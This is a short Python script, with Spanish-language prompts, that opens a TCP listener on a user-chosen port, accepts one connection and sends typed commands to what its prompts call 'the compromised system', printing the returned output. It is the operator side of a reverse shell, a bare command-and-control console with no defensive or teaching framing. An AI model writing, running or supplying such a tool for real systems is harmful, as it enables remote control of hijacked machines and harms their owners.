import socket

def start_server():
    server_port = int(input("Ingresa el puerto en el que deseas ejecutar el servidor: "))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.bind(('0.0.0.0', server_port))
    except socket.error as e:
        print("Error al enlazar el socket:", e)
        return

    s.listen(1)
    print(f"Servidor a la escucha en el puerto {server_port}")

    conn, addr = s.accept()
    print(f"Conexión entrante desde {addr[0]}:{addr[1]}")

    while True:
        command = input("Ingrese un comando para enviar al sistema comprometido (exit para salir): ")

        if command.lower() == 'exit':
            break

        conn.send(command.encode())

        output_result = conn.recv(1024).decode()

        print("Resultado del sistema comprometido:")
        print(output_result)

    conn.close()

start_server()
